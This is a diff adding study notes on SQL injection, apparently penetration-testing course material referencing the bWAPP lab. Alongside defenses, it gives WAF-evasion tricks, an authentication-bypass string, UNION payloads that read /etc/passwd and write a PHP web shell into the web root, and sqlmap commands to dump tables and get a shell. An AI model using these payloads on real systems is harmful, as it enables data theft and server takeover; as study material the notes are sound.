@@ -1,0 +1,80 @@
+	SQLi Concepts:
+SQL injection - inject a query into sql database
+Concern:
+  CIA Triad can be compromised. Data can be extracted, modified, deleted, accessed, or manipulated to RCE
+How does this happen:
+  Insecure coding
+  Excessive trust of user input
+Types of SQL Injections:
+  Authentication Bypass - Goal is to bypass login or auth wall, not necessarily gather data from DB
+    Username: ' or 1=1--
+  Error-based SQLi
+    Payloads can be found on github
+  Blind SQLi
+  NoSQL (non SQL injections) - modify SQL bypass to fit nosql syntax
+How do you find SQL injection points:
+  Things like: login forms, dynamic site pages, search boxes, URLs, anywhere that takes user input
+  URL params that contain id=XX
+  Page Source - look for inputs that are not visible on page
+  API calls
+  AUTOMATION
+    Vulnerability Scanners like nessus can check for SQLi programmatically
+    SQL injection specific vuln scanners like SQLmap can verify injection points much better
+    SQLninja
+    Mobile SQL injection tools
+Common Defenses Against SQLi:
+  Regex filter or other input validation filtering
+  Web application firewalls that have SQL injection detectors
+  Least privilege, make sure www-data or other service accounts don't have full access
+  Use parameterized/stored procedures
+Ways around defenses:
+  Query Obfuscations
+  Inline comments
+  Make your queries look as weird as possible to find loopholes in WAF
+  Null Bytes breaking up query such as %00
+  Create SQL Variables with query inside
+  URL encode all special characters: %39 instead of '
+  Concatenation un+ion sel+ect
+  Use uncommon queries. Instead of 1=1 try 'dog'='dog'
+  
+	Error-Based SQL Injection Attacks:
+Error-Based SQL injections - try to make website throw sql error.
+  Confirms good sql injections and verifies injection capabilities
+Method:
+  Test for SQL injection spots
+  Use Single quotes to try to throw an error
+  Entry: 'order by [max columns + 1] -- to get number of columns
+  Now you can enumerate all columns with 'union select 1,2,3...[max column] -- 
+  Instead of tables, you can union select other helpful data like @@version, user(), table_name, 
+
+	Blind-Based SQL injection Attacks:
+Some attacks have no indication of if they are working
+Turn to blind based when you have no visible indicator
+Techniques:
+  Boolean - Inject data and interpret based on if query is successful or not.
+  Time-Based - Add sql wait functions that hang for a set time to determine if wait functions execute along with query
+  
+	SQLi to System Access:
+Objective: Take over machine using SQLi in order to read/write files, execute code
+Once injection spot is discovered, to read:
+  cmd: 'union select 1, load_file("/etc/passwd"),3,4...[max column] -- 
+  Read any file within the security context of the user being exploited (typically mysql user).  
+Write:
+  cmd: 'union select 1,"[file contents]",3,4...[max column] into OUTFILE '[file location]' --
+  Good place to write to could be web directory /documents or /images, since it is meant to accept user input
+Code Execuction (Builds upon Write):
+  cmd: 'union all select 1,"<?php echo shell_exec($_GET['cmd'];?>)",3,4,5,6,7 into OUTFILE '/var/www/bWAPP/documents/x.php'
+  Good idea to search for nc 
+  
+	SQLmap:
+Used to automate discovery of SQL injection vulnerabilities
+Uses:
+  For GET request:
+    sqlmap --url="http://[target ip]/path/to/injectable/spot.php?param=1&param=2" --dbs
+    Ensure that any necessary cookies are provided using --cookie=
+    For POST requests, ensure that any necessary data is provided using --data=
+ Afterwards, to describe given database with tables, remove --dbs and add -D [database] --tables
+ To describe a table, add -D [database] -T [table]
+ To dump a table, add -D [database] -T [table] -C [column1, column2] --dump
+ To get shell access, add -D [database] --shell
+
